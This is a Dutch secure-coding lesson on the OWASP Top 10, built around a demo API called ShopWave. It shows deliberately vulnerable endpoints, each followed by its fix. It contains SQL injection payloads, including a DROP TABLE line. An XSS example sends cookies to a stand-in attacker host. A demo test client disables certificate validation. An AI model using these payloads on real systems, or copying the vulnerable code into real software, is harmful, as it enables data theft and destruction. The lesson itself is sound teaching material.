---
title: "Les 9: Secure Coding — OWASP Top 10"
sidebar_label: "Secure Coding (OWASP)"
---

# Les 9: Secure Coding — OWASP Top 10

## ShopWave

ShopWave heeft op dit punt een solide beveiligingsfundament: wachtwoorden worden gehasht met salt, 2FA beschermt de loginflow, orders worden digitaal ondertekend, de API draait op HTTPS en JWT bewaakt de endpoints. Maar al die maatregelen beschermen de communicatie en de authenticatie — ze beschermen niet tegen fouten in de code zelf.

Een aanvaller hoeft HTTPS niet te omzeilen als hij een invoerveld kan misbruiken om rechtstreeks de database te lezen. Hij hoeft geen JWT te stelen als een foutmelding de volledige serverstructuur blootgeeft. Beveiliging begint niet bij de netwerklaag — het begint bij elke regel code die je schrijft.

De **OWASP Top 10** is een lijst van de meest voorkomende en gevaarlijkste kwetsbaarheden in webapplicaties, samengesteld door een internationale gemeenschap van beveiligingsexperts. In deze les behandelen we de meest kritieke kwetsbaarheden voor ShopWave in detail; de overige kennen we kort.

### OWASP Top 10 (2021) — overzicht

| # | Naam | Kernprobleem | ShopWave-voorbeeld |
|---|------|--------------|--------------------|
| **A01** | Broken Access Control | Gebruikers kunnen acties uitvoeren buiten hun rechten | Klant raadpleegt bestellingen van andere klant |
| **A02** | Cryptographic Failures | Gevoelige data onvoldoende versleuteld of gehasht | Wachtwoorden als plain text; SHA-256 voor wachtwoorden |
| **A03** | Injection | Onbetrouwbare data uitgevoerd als code | SQL Injection in productzoekfunctie |
| **A04** | Insecure Design | Architectuur mist beveiliging van bij het begin | Geen lockout na herhaalde mislukte logins |
| **A05** | Security Misconfiguration | Standaardinstellingen, debug-info in productie | Stack trace zichtbaar in foutmelding |
| **A06** | Vulnerable Components | Verouderde bibliotheken met bekende kwetsbaarheden | NuGet-pakket met gekende CVE |
| **A07** | Auth & Session Failures | Zwakke authenticatie, onveilig sessiebeheer | JWT zonder vervaldatum; geen 2FA |
| **A08** | Software & Data Integrity | Onbetrouwbare updates of deserialisatie | NuGet-pakket vervangen door malafide versie |
| **A09** | Logging & Monitoring Failures | Aanvallen worden niet gedetecteerd | Geen logging van mislukte loginpogingen |
| **A10** | SSRF | Server vraagt externe URL op gestuurd door gebruiker | API haalt URL op die aanvaller meestuurt |

In deze les diepen we A03 (Injection), A05 (Misconfiguration), A07 (Auth Failures via XSS) en A06 (Vulnerable Components) verder uit.

---

## Theorie

### 1. SQL Injection

#### Wat is het?

SQL Injection is een aanvalstechniek waarbij een aanvaller erin slaagt zijn eigen SQL-code in te voegen in een query die door de applicatie wordt uitgevoerd. Dit is mogelijk wanneer gebruikersinput rechtstreeks wordt samengevoegd met een SQL-query in plaats van als losse parameter te worden doorgegeven.

#### Hoe ontstaat het?

Beschouw een zoekfunctie die producten opzoekt op naam:

```csharp
string query = $"SELECT * FROM products WHERE name = '{input}'";
```

De ontwikkelaar verwacht dat `input` een gewone productnaam is, zoals `"Laptop"`. De query wordt dan:

```sql
SELECT * FROM products WHERE name = 'Laptop'
```

Maar wat als een aanvaller dit invoert als zoekopdracht?

```
' OR '1'='1
```

De samengestelde query wordt:

```sql
SELECT * FROM products WHERE name = '' OR '1'='1'
```

`OR '1'='1'` is altijd waar — de query geeft alle rijen in de tabel terug, ongeacht de naam. De aanvaller heeft in één stap de volledige producttabel uitgelezen.

Gevaarlijker nog is de commentaarvariant:

```
'; DROP TABLE products --
```

Dit wordt:

```sql
SELECT * FROM products WHERE name = ''; DROP TABLE products --'
```

Als de databasegebruiker voldoende rechten heeft, wordt de producttabel volledig vernietigd.

#### Bekende incidenten

- **Heartland Payment Systems (2008)** — SQL Injection gaf aanvallers toegang tot meer dan 130 miljoen creditcardnummers. Op dat moment de grootste datadiefstal ooit.
- **TalkTalk (2015)** — een Britse telecomoperator verloor via SQL Injection de persoonsgegevens van 157.000 klanten. Boete: 400.000 pond. De aanval werd uitgevoerd door een 17-jarige.
- **Yahoo (2012)** — 450.000 inloggegevens gelekt via een SQL Injection-aanval op één van hun subplatforms.

#### Waarom is string interpolatie gevaarlijk?

Wanneer je een query bouwt via string interpolatie (`$"...{input}..."` of `string.Format`), behandelt de database de samengevoegde tekst als één geheel. Ze kan het onderscheid niet meer maken tussen wat jij als SQL bedoelde en wat de gebruiker intikte. De aanvaller schrijft gewoon mee aan jouw query.

#### De oplossing: parameterized queries

```csharp
SqlCommand cmd = new SqlCommand(
    "SELECT * FROM products WHERE name = @name", conn);
cmd.Parameters.AddWithValue("@name", input);
```

Met een parameterized query stuurt de applicatie de SQL-structuur en de data als twee aparte berichten naar de database. De database behandelt `@name` altijd als een waarde — nooit als SQL-code. Zelfs als de gebruiker `' OR '1'='1` invoert, zoekt de database letterlijk naar een product met die naam in de kolom `name` en vindt niets.

**In ShopWave** gebruiken we momenteel geen echte database, maar een `List<string>` in geheugen. Toch zien we dezelfde fout opduiken wanneer we string interpolatie gebruiken als filter — en dezelfde fix toepassen.

---

### 2. Cross-Site Scripting (XSS)

#### Wat is het?

**XSS** is een aanvalstechniek waarbij een aanvaller kwaadaardige JavaScript injecteert in een webpagina die vervolgens door andere gebruikers wordt bekeken. De browser van de slachtoffers voert die JavaScript uit alsof het code is van de eigenaar van de site.

Er zijn drie varianten:

| Variant | Hoe werkt het? |
|---------|---------------|
| **Stored XSS** | De payload wordt opgeslagen in de database (bv. via een commentaarveld) en uitgevoerd bij elke bezoeker die de pagina laadt |
| **Reflected XSS** | De payload zit in de URL (bv. een zoekterm) en wordt direct teruggekaatst in de response |
| **DOM-based XSS** | De payload manipuleert het DOM client-side via JavaScript, zonder dat de server er iets mee te maken heeft |

#### Hoe ontstaat het?

Een eenvoudig commentaarsysteem dat input toont zonder encoding:

```html
<p>@Html.Raw(comment.Text)</p>
```

Als een aanvaller dit als comment plaatst:

```html
<script>
  fetch('https://aanvaller.be/steal?cookie=' + document.cookie);
</script>
```

Wordt dit script letterlijk in de HTML-pagina opgenomen. Elke bezoeker die de pagina laadt, voert dat script uit. De aanvaller ontvangt de cookies van alle bezoekers — inclusief hun sessietokens — op zijn eigen server.

Het script kan ook het DOM manipuleren om een nepinlogformulier te tonen dat credentials steelt, of de gebruiker omleiden naar een phishingpagina.

#### Bekende incidenten

- **British Airways (2018)** — aanvallers injecteerden via XSS een script op de betaalpagina dat creditcardgegevens van 500.000 klanten naar een externe server stuurde. Boete: 20 miljoen pond (GDPR).
- **eBay (2015, 2016)** — herhaaldelijke XSS-kwetsbaarheden op productpagina's lieten aanvallers valse inhoud injecteren en bezoekers omleiden naar malwareservers.
- **Twitter (2010)** — de "onMouseOver"-worm verspreidde zich viraal over Twitter via een XSS-kwetsbaarheid. Gebruikers die over een tweet hoverkten, plaatsten automatisch berichten.

#### De oplossing: output encoding

```html
<!-- FOUT -->
<p>@Html.Raw(comment.Text)</p>

<!-- CORRECT -->
<p>@comment.Text</p>
```

Razor encodeert automatisch wanneer je `@variabele` schrijft. De tekst `<script>alert('xss')</script>` wordt weergegeven als de letterlijke tekst `&lt;script&gt;alert('xss')&lt;/script&gt;` — de browser ziet dit als tekst, niet als code.

`Html.Raw()` vertelt Razor uitdrukkelijk: "render dit als ruwe HTML, codeer niets." Dit is bijna nooit wat je wil bij gebruikersinput.

**In een Minimal API** zoals ShopWave retourneren we JSON — geen HTML. XSS is hier minder direct van toepassing. Maar de onderliggende regel — vertrouw nooit input, codeer altijd output — geldt overal.

---

### 3. Security Misconfiguration

#### Wat is het?

Security Misconfiguration is geen aanvalstechniek maar een categorie van fouten in de configuratie van een applicatie of server die een aanvaller toelaat informatie te vergaren of toegang te krijgen die hij niet zou mogen hebben.

Het bijzondere aan misconfiguratie is dat de code zelf correct kan zijn — het is de manier waarop de applicatie is geconfigureerd die het probleem veroorzaakt.

Veelvoorkomende vormen:

- **Developer Exception Page in productie** — lekt stacktraces, bestandspaden, databaseverbindingsstrings en servernamen
- **Swagger publiek beschikbaar** — toont de volledige API-structuur, alle endpoints, verwachte parameters en responses aan iedereen
- **Directory browsing aan** — geeft een aanvaller een lijst van alle bestanden op de server
- **Geheimen in code of configuratiebestanden** — wachtwoorden en API-sleutels hardcoded in bestanden die in een Git-repository terechtkomen
- **HTTPS niet verplicht** — de applicatie accepteert ook onbeveiligde HTTP-verbindingen
- **Standaardwachtwoorden** — database of admin-panel met het standaardwachtwoord van de leverancier

#### Waarom is dit zo gevaarlijk?

Een aanvaller start een aanval bijna altijd met een verkenningsfase. Hij verzamelt informatie over de doelomgeving: welke server, welk framework, welke versie, welke endpoints bestaan er, hoe zien foutmeldingen eruit?

Een Developer Exception Page geeft hem in één keer: het exacte framework en de versie, de volledige bestandsstructuur van de applicatie, de connectiestring naar de database, de interne variabelenamen en waarden op het moment van de fout. Met die informatie kan hij gericht bekende kwetsbaarheden opzoeken voor die specifieke versie.

#### Bekende incidenten

- **Equifax (2017)** — een bekende kwetsbaarheid in Apache Struts was al maandenlang gepubliceerd maar niet gepatcht. 147 miljoen Amerikanen verloren hun persoonsgegevens, waaronder burgerservicenummers en kredietscores. Boetes en schikkingen: meer dan 700 miljoen dollar.
- **Capital One (2019)** — een verkeerd geconfigureerde firewall in AWS gaf een aanvaller toegang tot de persoonsgegevens van 100 miljoen klanten.
- **GitHub-tokens in publieke repositories (doorlopend)** — dagelijks worden duizenden API-sleutels, wachtwoorden en tokens per ongeluk gepubliceerd op GitHub. Bots scannen GitHub continu en misbruiken die gegevens binnen minuten.

#### De oplossing: omgevingsafhankelijke configuratie

De kernregel: wat nuttig is in development, is gevaarlijk in productie.

```csharp
// FOUT: altijd aan, ook in productie
app.UseDeveloperExceptionPage();

// CORRECT: enkel in development
if (app.Environment.IsDevelopment())
{
    app.UseDeveloperExceptionPage();
}
else
{
    app.UseExceptionHandler("/error");
}
```

Voor geheimen: gebruik **User Secrets** in development en **environment variables** in productie. Nooit hardcoded in code.

---

### 4. Input Validatie en het principe van Least Trust

#### Wat is het?

**Input validatie** is het proces waarbij je elke waarde die van buitenaf de applicatie binnenkomt controleert vóór je er iets mee doet. "Van buitenaf" betekent: URL-parameters, POST-body, headers, cookies — alles wat de client stuurt.

Het onderliggende principe heet **Least Trust** of **Zero Trust**: ga er altijd van uit dat input kwaadaardig of incorrect is totdat je het tegendeel bewezen hebt. Vertrouw nooit de client.

Dit klinkt vanzelfsprekend maar wordt systematisch vergeten. Redenen waarom:

- De client valideert al — *maar client-side validatie is triviaal te omzeilen via DevTools of een HTTP-client*
- De invoer komt van een intern systeem — *maar ook interne systemen kunnen gehackt of misbruikt worden*
- Het is maar een demo — *maar demo-code eindigt vaker in productie dan je denkt*

#### Wat valideer je?

| Eigenschap | Voorbeeld |
|-----------|-----------|
| Aanwezig | E-mailadres mag niet leeg zijn |
| Formaat | E-mailadres moet een `@` en een `.` bevatten |
| Lengte | Wachtwoord minstens 8 tekens, maximaal 128 tekens |
| Type | Leeftijd moet een getal zijn, geen tekst |
| Bereik | Kortingspercentage tussen 0 en 100 |
| Toegestane waarden | Status moet "pending", "shipped" of "cancelled" zijn |

#### Wat geef je terug bij ongeldige input?

Een `400 Bad Request` met een duidelijke melding over wat er fout is — zonder interne details prijs te geven. Nooit een `500 Internal Server Error` door ongeldige input: dat betekent dat je code crasht op iets wat een gebruiker stuurde, wat altijd vermeden moet worden.

---

## Demo

We bouwen vier beveiligingsproblemen in `ShopWave.Api`, demonstreren hoe een aanval eruitziet en lossen ze daarna op. Alles in de bestaande solution — geen nieuw project nodig.

---

### Stap 1 — SQL Injection demonstreren en fixen

We voegen een zoekendpoint toe aan `ShopWave.Api`. Eerst de kwetsbare versie.

**Bestand: `ShopWave.Api/Program.cs`** — voeg toe na de service-aanmaak:

```csharp
List<string> orderDatabase = new List<string>
{
    "alice@shopwave.be|Laptop|999.99",
    "bob@shopwave.be|Muis|29.99",
    "alice@shopwave.be|Toetsenbord|79.99",
    "admin@shopwave.be|Server|4999.99"
};
```

Dit stelt onze in-memory database voor. In een echte applicatie zou dit een SQL-database zijn.

Nu het kwetsbare zoekendpoint:

```csharp
app.MapGet("/orders/zoek", (string email) =>
{
    // KWETSBAAR: input rechtstreeks in de "query" geplakt
    string query = $"SELECT * FROM orders WHERE email = '{email}'";
    Console.WriteLine($"[KWETSBAAR] Query: {query}");

    List<string> resultaten = orderDatabase
        .Where(o => o.Contains(email))
        .ToList();

    return Results.Ok(new { query = query, resultaten = resultaten });
});
```

Start de API en test via de browser:

**Normale zoekopdracht:**
```
https://localhost:5001/orders/zoek?email=alice@shopwave.be
```

Output in de console:
```
[KWETSBAAR] Query: SELECT * FROM orders WHERE email = 'alice@shopwave.be'
```

Resultaat: de twee orders van Alice.

**Nu de aanval — typ dit als e-mailadres:**
```
https://localhost:5001/orders/zoek?email=' OR '1'='1
```

Output in de console:
```
[KWETSBAAR] Query: SELECT * FROM orders WHERE email = '' OR '1'='1'
```

Resultaat: alle vier de orders — ook die van admin@shopwave.be. In een echte database zou dit alle klantgegevens blootleggen.

Vervang het endpoint nu door de veilige versie:

```csharp
app.MapGet("/orders/zoek", (string email) =>
{
    // VEILIG: parameter staat volledig los van de query-structuur
    // In een echte database: SqlCommand met Parameters.AddWithValue("@email", email)
    // De database behandelt @email altijd als waarde, nooit als SQL-code
    Console.WriteLine($"[VEILIG] Parameter @email = {email}");

    List<string> resultaten = orderDatabase
        .Where(o => o.StartsWith(email + "|", StringComparison.OrdinalIgnoreCase))
        .ToList();

    return Results.Ok(new { resultaten = resultaten });
});
```

Test opnieuw met de aanval — er komen nu nul resultaten terug. De injectie heeft geen effect meer.

---

### Stap 2 — Security Misconfiguration: informatielekkage

We voegen een endpoint toe dat een fout gooit en demonstreren het verschil tussen de configuraties.

**Bestand: `ShopWave.Api/Program.cs`** — voeg toe na `app.UseAuthorization()`:

```csharp
// KWETSBAAR: altijd aan, ook buiten development
app.UseDeveloperExceptionPage();
```

Voeg daarna een crashend endpoint toe:

```csharp
app.MapGet("/crash", () =>
{
    throw new InvalidOperationException(
        "Databaseverbinding mislukt op SHOPWAVE-DB-01 (192.168.1.50:3306)" +
        " — connection string: Server=192.168.1.50;Uid=shopwave_admin;Pwd=ShopW@ve2024!");
});
```

Navigeer naar `https://localhost:5001/crash`. De volledige stacktrace is zichtbaar in de browser — inclusief het IP-adres van de databaseserver, de gebruikersnaam en het wachtwoord van de databasegebruiker, het volledige pad van elk bestand dat betrokken was in de call stack.

Een aanvaller heeft nu alles wat hij nodig heeft om rechtstreeks verbinding te maken met de database, buiten de applicatie om.

Vervang de misconfiguratie door de correcte versie:

```csharp
if (app.Environment.IsDevelopment())
{
    app.UseDeveloperExceptionPage();
}
else
{
    app.UseExceptionHandler(errorApp =>
    {
        errorApp.Run(async context =>
        {
            Microsoft.AspNetCore.Diagnostics.IExceptionHandlerFeature? feature =
                context.Features.Get<
                    Microsoft.AspNetCore.Diagnostics.IExceptionHandlerFeature>();

            if (feature != null)
            {
                // De fout loggen server-side — niet naar de client sturen
                Console.Error.WriteLine($"[FOUT] {feature.Error.Message}");
            }

            context.Response.StatusCode = 500;
            await context.Response.WriteAsync("Er is een fout opgetreden.");
        });
    });
}
```

Navigeer opnieuw naar `/crash`. De browser toont enkel `Er is een fout opgetreden.` De fout staat wél in de server-console maar lekt niets naar de client.

Beperk ook Swagger tot development:

```csharp
// FOUT: swagger altijd beschikbaar — geeft de volledige API-structuur prijs
app.UseSwagger();
app.UseSwaggerUI();
```

```csharp
// CORRECT: swagger enkel zichtbaar tijdens ontwikkeling
if (app.Environment.IsDevelopment())
{
    app.UseSwagger();
    app.UseSwaggerUI();
}
```

---

### Stap 3 — Input validatie toevoegen

Elk endpoint dat data ontvangt, vertrouwt momenteel blindelings op de client. We voegen validatie toe aan het `/register`-endpoint.

**Bestand: `ShopWave.Api/Program.cs`** — vervang het bestaande register-endpoint:

Begin met de check op leeg e-mailadres:

```csharp
app.MapPost("/register", (RegisterRequest request) =>
{
    if (string.IsNullOrWhiteSpace(request.Email))
    {
        return Results.BadRequest(new { fout = "E-mailadres is verplicht." });
    }
```

`IsNullOrWhiteSpace` vangt zowel `null` als lege strings en strings die enkel spaties bevatten op. Een client die een leeg e-mailadres stuurt, crasht de applicatie niet meer.

Voeg de formaatcontrole toe:

```csharp
    if (!request.Email.Contains("@") || !request.Email.Contains("."))
    {
        return Results.BadRequest(new { fout = "Ongeldig e-mailadres." });
    }
```

Dit is een basiscontrole. In productie zou je een strikte reguliere expressie gebruiken of de `MailAddress`-klasse van .NET, maar voor onze doeleinden volstaat dit.

Voeg de wachtwoordcontroles toe:

```csharp
    if (string.IsNullOrWhiteSpace(request.Password))
    {
        return Results.BadRequest(new { fout = "Wachtwoord is verplicht." });
    }

    if (request.Password.Length < 8)
    {
        return Results.BadRequest(new { fout = "Wachtwoord moet minstens 8 tekens bevatten." });
    }

    if (request.Password.Length > 128)
    {
        return Results.BadRequest(new { fout = "Wachtwoord mag maximaal 128 tekens bevatten." });
    }
```

De maximumlengte van 128 tekens beschermt tegen een specifieke aanval waarbij een aanvaller een extreem lang wachtwoord stuurt. Sommige hashing-algoritmen worden merkbaar trager bij lange invoer — een aanvaller kan dit misbruiken om de server te overbelasten.

Sluit het endpoint af:

```csharp
    accountRepository.Register(request.Email, request.Password);
    return Results.Ok(new { bericht = "Geregistreerd." });
});
```

---

### Stap 4 — Geheimen naar User Secrets

De JWT-sleutel staat momenteel hardcoded in `Program.cs`:

```csharp
const string SecretKey = "ShopWaveGeheimeSleutel2024!!XYZ#";
```

Als deze code in een publieke Git-repository terechtkomt — of zelfs in een privérepository met meerdere medewerkers — is de sleutel gecompromitteerd. Iedereen die de sleutel kent, kan geldige JWT-tokens aanmaken voor elke gebruiker van ShopWave.

De oplossing is **.NET User Secrets**: een mechanisme dat gevoelige configuratiewaarden opslaat buiten de projectmap, zodat ze nooit per ongeluk in een repository terechtkomen.

Voer uit in de terminal vanuit de map van `ShopWave.Api`:

```
dotnet user-secrets init
dotnet user-secrets set "Jwt:SecretKey" "ShopWaveGeheimeSleutel2024!!XYZ#"
dotnet user-secrets set "Jwt:Issuer" "shopwave-api"
dotnet user-secrets set "Jwt:Audience" "shopwave-client"
```

**Bestand: `ShopWave.Api/Program.cs`** — vervang de hardcoded constanten:

```csharp
string secretKey = builder.Configuration["Jwt:SecretKey"]
    ?? throw new InvalidOperationException("Jwt:SecretKey is niet geconfigureerd.");

string issuer = builder.Configuration["Jwt:Issuer"]
    ?? throw new InvalidOperationException("Jwt:Issuer is niet geconfigureerd.");

string audience = builder.Configuration["Jwt:Audience"]
    ?? throw new InvalidOperationException("Jwt:Audience is niet geconfigureerd.");
```

`builder.Configuration` leest automatisch uit User Secrets in development en uit environment variables in productie. De `??`-operator gooit een duidelijke fout als een waarde ontbreekt — zodat de applicatie meteen stopt in plaats van stil te falen met een cryptische null-reference exception later.

De sleutel staat nu nergens meer in de code. Controleer dit door naar `appsettings.json` en `Program.cs` te kijken — nergens een hardcoded geheim.

---

### Stap 5 — De volledige flow testen

Test alle vier de stappen vanuit `ShopWave/Program.cs`:

```csharp
using System.Net.Http;
using System.Text;
using System.Text.Json;

HttpClientHandler handler = new HttpClientHandler();
handler.ServerCertificateCustomValidationCallback =
    (message, certificate, chain, errors) => true;

HttpClient client = new HttpClient(handler);
client.BaseAddress = new Uri("https://localhost:5001");
```

Test SQL Injection:

```csharp
Console.WriteLine("=== SQL Injection test ===");

HttpResponseMessage normaal = client.GetAsync(
    "/orders/zoek?email=alice@shopwave.be").Result;
Console.WriteLine($"Normaal: {normaal.StatusCode}");
Console.WriteLine(normaal.Content.ReadAsStringAsync().Result);

HttpResponseMessage injectie = client.GetAsync(
    "/orders/zoek?email=' OR '1'='1").Result;
Console.WriteLine($"Injectie: {injectie.StatusCode}");
Console.WriteLine(injectie.Content.ReadAsStringAsync().Result);
```

Test input validatie:

```csharp
Console.WriteLine("=== Input validatie test ===");

string leegEmail = JsonSerializer.Serialize(
    new { email = "", password = "wachtwoord123" });
HttpResponseMessage r1 = client.PostAsync("/register",
    new StringContent(leegEmail, Encoding.UTF8, "application/json")).Result;
Console.WriteLine($"Leeg e-mail: {r1.StatusCode} — {r1.Content.ReadAsStringAsync().Result}");

string kortWachtwoord = JsonSerializer.Serialize(
    new { email = "test@shopwave.be", password = "kort" });
HttpResponseMessage r2 = client.PostAsync("/register",
    new StringContent(kortWachtwoord, Encoding.UTF8, "application/json")).Result;
Console.WriteLine($"Kort wachtwoord: {r2.StatusCode} — {r2.Content.ReadAsStringAsync().Result}");

string geldig = JsonSerializer.Serialize(
    new { email = "nieuw@shopwave.be", password = "VeiligWw1!" });
HttpResponseMessage r3 = client.PostAsync("/register",
    new StringContent(geldig, Encoding.UTF8, "application/json")).Result;
Console.WriteLine($"Geldig: {r3.StatusCode} — {r3.Content.ReadAsStringAsync().Result}");
```

Test de crashpagina:

```csharp
Console.WriteLine("=== Foutafhandeling test ===");

HttpResponseMessage crash = client.GetAsync("/crash").Result;
Console.WriteLine($"Crash: {crash.StatusCode}");
Console.WriteLine(crash.Content.ReadAsStringAsync().Result);
```

Observeer: de status is `500`, de body is enkel `Er is een fout opgetreden.` — geen stacktrace, geen interne details.

```csharp
handler.Dispose();
client.Dispose();
```

---

## Oefeningen

### Oefening 1 — SQL Injection op productnaam

Breid de zoekfunctie uit met een endpoint dat zoekt op productnaam in plaats van e-mailadres.

**Bestand: `ShopWave.Api/Program.cs`**

```csharp
app.MapGet("/orders/zoek-product", (string product) =>
{
    // Schrijf eerst de kwetsbare versie
    // Test de aanval: ?product=' OR '1'='1
    // Observeer: alle orders worden zichtbaar
    // Vervang daarna door de veilige versie
    // Test opnieuw: de aanval heeft geen effect meer
});
```

Schrijf beide versies, test beide en beantwoord:
1. Waarom maakt `OR '1'='1` de WHERE-voorwaarde altijd waar?
2. Wat doet `--` in een SQL-query?
3. Wat is het concrete verschil tussen de kwetsbare en veilige implementatie?
4. Hoe zou je dit in een echte SQL-database oplossen met `SqlCommand`?

---

### Oefening 2 — Input validatie uitbreiden

Voeg validatie toe aan het `/login`-endpoint en het `/verify`-endpoint.

**Bestand: `ShopWave.Api/Program.cs`**

Voor `/login`:
- E-mailadres mag niet leeg zijn
- E-mailadres moet een `@` bevatten
- Wachtwoord mag niet leeg zijn

Voor `/verify`:
- E-mailadres mag niet leeg zijn
- De 2FA-code moet exact 6 tekens lang zijn
- De 2FA-code mag enkel cijfers bevatten — gebruik `code.All(char.IsDigit)`

Schrijf daarna in `ShopWave/Program.cs` een reeks requests die elk foutgeval testen. Controleer telkens of de statuscode `400 Bad Request` is en of de foutmelding begrijpelijk is.

---

### Oefening 3 — XSS in context begrijpen

ShopWave heeft geen web-UI met Razor-views, maar stel dat we in de toekomst een beheerspaneel bouwen. Een medewerker kan via dat paneel notities toevoegen aan een bestelling.

Schrijf een korte analyse (geen code):

1. Wat zou er misgaan als we notities opslaan en weergeven via `@Html.Raw(notitie.Text)`?
2. Geef een voorbeeld van een kwaadaardige payload die een aanvaller zou kunnen invoeren.
3. Wat zou die payload doen bij andere bezoekers van het beheerspaneel?
4. Welke twee maatregelen lossen dit op?
5. Waarom is XSS in een beheerspaneel gevaarlijker dan op een publieke pagina?

---

### Oefening 4 — Misconfiguratie analyse

Bekijk de `Program.cs` van `ShopWave.Api` die je tot nu toe gebouwd hebt en beantwoord:

1. Is de Developer Exception Page correct geconfigureerd? Controleer of hij omgevingsafhankelijk is.
2. Is Swagger beperkt tot development?
3. Staan er nog geheimen hardcoded? Controleer ook de JWT-constanten.
4. Accepteert de API ook HTTP-verbindingen? Zoek naar `UseHttpsRedirection`.
5. Wat zou een aanvaller concreet kunnen doen als de JWT-sleutel hardcoded in een publieke GitHub-repository staat?

---

### Oefening 5 — OWASP-analyse van een reëel incident

Lees het volgende scenario en analyseer het:

> **Scenario: ShopWave na een maand in productie**
>
> ShopWave is live gegaan. Na één maand meldt een beveiligingsonderzoeker het volgende:
> - Hij vond via het zoekendpoint een manier om alle orders van alle klanten op te vragen
> - Hij vond via `/swagger` een endpoint `/admin/stats` dat nergens gedocumenteerd was
> - Hij vond de JWT-sleutel via een oude commit in de GitHub-repository
> - Via `/crash` had hij een week eerder de volledige databaseconnectiestring kunnen lezen

Beantwoord per bevinding:
1. Welke OWASP-kwetsbaarheid is dit?
2. Welke CIA-pijler wordt geschonden?
3. Welke concrete maatregel had dit voorkomen?
4. Wat is de potentiële impact voor ShopWave en haar klanten?

---

## Modeloplossing

> De modeloplossing is beschikbaar na het indienen van de labo-opdracht via Digitap.

---

### Modeloplossing Oefening 1 — Zoekendpoint op productnaam

**Bestand: `ShopWave.Api/Program.cs`**

Kwetsbare versie (ter demonstratie):

```csharp
app.MapGet("/orders/zoek-product", (string product) =>
{
    // KWETSBAAR: string interpolatie
    string query = $"SELECT * FROM orders WHERE product = '{product}'";
    Console.WriteLine($"[KWETSBAAR] Query: {query}");

    List<string> resultaten = orderDatabase
        .Where(o => o.Contains(product))
        .ToList();

    return Results.Ok(new { query = query, resultaten = resultaten });
});
```

Veilige versie:

```csharp
app.MapGet("/orders/zoek-product", (string product) =>
{
    // VEILIG: parameter staat los van de query-structuur
    Console.WriteLine($"[VEILIG] Parameter @product = {product}");

    List<string> resultaten = orderDatabase
        .Where(o =>
        {
            string[] delen = o.Split('|');
            bool gevonden = false;

            if (delen.Length >= 2)
            {
                gevonden = delen[1].Equals(product, StringComparison.OrdinalIgnoreCase);
            }

            return gevonden;
        })
        .ToList();

    return Results.Ok(new { resultaten = resultaten });
});
```

---

## Samenvatting

| Kwetsbaarheid | Oorzaak | Oplossing | CIA-pijler |
|--------------|---------|-----------|-----------|
| SQL Injection | Input in query via string interpolatie | Parameterized queries | Confidentiality, Integrity |
| XSS | Input in HTML zonder encoding | Output encoding, geen `Html.Raw()` | Confidentiality, Integrity |
| Security Misconfiguration | Omgevingsinstellingen verkeerd | Omgevingsafhankelijke configuratie, User Secrets | Confidentiality |
| Ontbrekende input validatie | Blind vertrouwen in de client | Altijd server-side valideren | Integrity, Availability |
| CORS-misconfiguratie | Verkeerde `AllowAnyOrigin`-instelling | Expliciet `WithOrigins(...)` benoemen | Confidentiality |
| Geen rate limiting | Onbeperkt loginpogingen | `AddRateLimiter` + `FixedWindowLimiter` | Availability |
| Verouderde packages (A06) | NuGet-pakket met gekende CVE | `dotnet list package --vulnerable` | Alle drie |

**Extra beveiligingsmaatregelen voor ASP.NET Core APIs:**

**CORS correct configureren (A05):**

```csharp
builder.Services.AddCors(options =>
{
    options.AddPolicy("ShopWavePolicy", policy =>
    {
        policy.WithOrigins("https://shopwave.be")   // nooit AllowAnyOrigin in productie
              .AllowAnyHeader()
              .AllowAnyMethod();
    });
});

// In de pipeline:
app.UseCors("ShopWavePolicy");
```

**Rate limiting voor login-endpoint (ASP.NET Core 7+):**

```csharp
builder.Services.AddRateLimiter(options =>
{
    options.AddFixedWindowLimiter("login", limiterOptions =>
    {
        limiterOptions.Window           = TimeSpan.FromMinutes(1);
        limiterOptions.PermitLimit      = 5;   // max 5 requests per minuut
        limiterOptions.QueueProcessingOrder = QueueProcessingOrder.OldestFirst;
        limiterOptions.QueueLimit       = 0;
    });
});

app.UseRateLimiter();

// Op het login-endpoint:
app.MapPost("/login", (...) => { ... }).RequireRateLimiting("login");
```

**Kwetsbare packages opsporen (A06):**

```
dotnet list package --vulnerable
```

Dit commando controleert alle NuGet-packages in de solution tegen de GitHub Advisory Database en toont packages met bekende CVEs. Voer dit regelmatig uit en in je CI/CD-pipeline.

**De gouden regel van secure coding:**

Vertrouw nooit input. Valideer altijd. Codeer altijd output. Configureer per omgeving. Hardcode nooit geheimen. Scan regelmatig op kwetsbare dependencies.

---

## Volgende les

Les 10 is **Testing: Integration testing met Mockoon**. We testen de ShopWave API via echte HTTP-requests en leren hoe je externe services simuleert met Mockoon zodat je tests niet afhankelijk zijn van externe systemen.